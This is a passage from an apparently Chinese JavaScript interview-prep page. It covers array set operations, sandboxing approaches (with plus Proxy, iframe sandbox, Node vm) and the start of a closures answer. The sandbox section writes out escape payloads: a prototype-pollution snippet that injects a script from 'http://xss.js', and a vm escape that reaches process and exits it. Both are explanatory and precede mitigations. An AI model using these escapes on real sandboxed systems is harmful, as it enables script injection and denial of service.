    <span class="token keyword">return</span> arr2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> newArr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// console.log(getIntersection(arr1, arr2));</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>并集：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getSet</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> newArr <span class="token operator">=</span> arr2<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> arr1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> arr1<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>newArr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getSet</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>补集：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getComplement</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> newArr1 <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> arr2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> newArr2 <span class="token operator">=</span> arr2<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> arr1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> newArr1<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>newArr2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="ES6："><a href="#ES6：" class="headerlink" title="ES6："></a>ES6：</h4><p>交集：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">getIntersection</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> arr1<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token operator">=></span> y<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getIntersection</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>并集：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">getSet</span><span class="token punctuation">(</span><span class="token parameter">arr1<span class="token punctuation">,</span> arr2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> x <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getSet</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="49、沙箱隔离怎么做的什么原理"><a href="#49、沙箱隔离怎么做的什么原理" class="headerlink" title="49、沙箱隔离怎么做的什么原理"></a>49、<del>沙箱隔离怎么做的什么原理</del></h3><p><strong>参考答案：</strong></p>
<p>沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。</p>
<p>实现沙箱的三种方法</p>
<ol>
<li>借助with + new Function</li>
</ol>
<p>首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">compileCode</span> <span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
  src <span class="token operator">=</span> <span class="token string">'with (exposeObj) &#123;'</span> <span class="token operator">+</span> src <span class="token operator">+</span> <span class="token string">'&#125;'</span>  
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'exposeObj'</span><span class="token punctuation">,</span> src<span class="token punctuation">)</span>   
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">compileCode</span> <span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
  src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">with (exposeObj) &#123; </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>src<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span> 
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'exposeObj'</span><span class="token punctuation">,</span> src<span class="token punctuation">)</span>   
<span class="token punctuation">&#125;</span> 
<span class="token keyword">function</span> <span class="token function">proxyObj</span><span class="token punctuation">(</span><span class="token parameter">originObj</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">let</span> exposeObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>originObj<span class="token punctuation">,</span><span class="token punctuation">&#123;</span> 
        <span class="token function-variable function">has</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span>key</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span> 
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"console"</span><span class="token punctuation">,</span><span class="token string">"Math"</span><span class="token punctuation">,</span><span class="token string">"Date"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
                <span class="token keyword">return</span> target<span class="token punctuation">[</span>key<span class="token punctuation">]</span>  
            <span class="token punctuation">&#125;</span> 
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>target<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Illegal operation for key </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> 
            <span class="token punctuation">&#125;</span> 
            <span class="token keyword">return</span> target<span class="token punctuation">[</span>key<span class="token punctuation">]</span>  
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  
    <span class="token keyword">return</span> exposeObj  

<span class="token punctuation">&#125;</span> 
<span class="token keyword">function</span> <span class="token function">createSandbox</span><span class="token punctuation">(</span><span class="token parameter">src<span class="token punctuation">,</span>obj</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
 <span class="token keyword">let</span> proxy <span class="token operator">=</span> <span class="token function">proxyObj</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>  
 <span class="token function">compileCode</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span>proxy<span class="token punctuation">)</span> <span class="token comment">//绑定this 防止this访问window </span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> testObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span> 
    <span class="token literal-property property">value</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>  
    <span class="token literal-property property">a</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> 
        <span class="token literal-property property">b</span><span class="token operator">:</span>  
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token function">createSandbox</span><span class="token punctuation">(</span><span class="token string">"value='haha';console.log(a)"</span><span class="token punctuation">,</span>testObj<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.<strong>proto</strong>就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">createSandbox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string"> 
a.b.__proto__.toString = ()=>&#123;  
 new (()=>&#123;&#125;).constructor("var script = document.createElement('script'); 
 script.src = 'http://xss.js';
 script.type = 'text/javascript'; 
 document.body.appendChild(script);")() 
&#125;
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>testObj<span class="token punctuation">)</span>  
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testObj<span class="token punctuation">.</span>a<span class="token punctuation">.</span>b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。</p>
<p>你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过<strong>proto</strong>查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token function-variable function">toString</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。</p>
<ol>
<li>借助iframe实现沙箱</li>
</ol>
<p>前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe sandbox src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 但是这也会带来一些限制：</p>
<ol>
<li><p>script脚本不能执行</p>
</li>
<li><p>不能发送ajax请求</p>
</li>
<li><p>不能使用本地存储，即localStorage,cookie等</p>
</li>
<li><p>不能创建新的弹窗和window</p>
</li>
<li><p>不能发送表单</p>
</li>
<li><p>不能加载额外插件比如flash等</p>
<p>不过别方，你可以对这个iframe标签进行一些配置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://static.nowcoder.com/images/activity/2021jxy/front/images/p.png" alt="img"></p>
</li>
</ol>
<p>接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。</p>
<p>1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。</p>
<p>2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。</p>
<p>3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制</p>
<p>简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。</p>
<ol>
<li>nodejs中的沙箱</li>
</ol>
<p>nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">const</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> 
vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Contextify the sandbox. </span>
<span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token string">'x += 40; var y = 17;'</span><span class="token punctuation">;</span>  
vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span> 
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 42 </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 17 </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1;   y is not defined.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。</p>
<p>但是vm是绝对安全的吗？不一定。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token string">"this.constructor.constructor('return process')().exit()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> ctx <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
ctx<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// ctx上不能包含引用类型的属性 </span>
vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token string">"this.constructor.constructor('return process')().exit()"</span><span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>让我们来看一下TSW中是怎么使用的：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">const</span> SbFunction <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span><span class="token string">'(Function)'</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 沙堆  </span>
<span class="token operator">...</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span>opt<span class="token punctuation">.</span>jsonpCallback<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
  code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">var result=null; var </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>opt<span class="token punctuation">.</span>jsonpCallback<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=function($1)&#123;result=$1&#125;; </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>responseText<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; return result;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  
  obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SbFunction</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>   
<span class="token operator">...</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。</p>
<h3 id="53、闭包的理解"><a href="#53、闭包的理解" class="headerlink" title="53、闭包的理解"></a>53、闭包的理解</h3><p><strong>参考答案：</strong></p>
<p>闭包：</p>
<p> 一个函数和对其周围状态（<strong>lexical environment，词法环境</strong>）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是<strong>闭包</strong>（<strong>closure</strong>）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。</p>
<p>闭包的特点：</p>
<p> 让外部访问函数内部变量成为可能；<br>​ 可以避免使用全局变量，防止全局变量污染；<br>​ 可以让局部变量常驻在内存中；<br>​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放）</p>
<p>应用场景</p>
<ol>
<li>埋点（是网站分析的一种常用的数据采集方法）计数器</li>
</ol>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">++</span>num
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> getNum <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> getNewNum <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'点击加入购物车次数： '</span><span class="token operator">+</span><span class="token function">getNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'点击付款次数： '</span><span class="token operator">+</span><span class="token function">getNewNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>事件+循环</li>
</ol>
<p>按照以下方式添加事件，打印出来的i不是按照序号的</p>
<p>形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> lis <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> lis<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
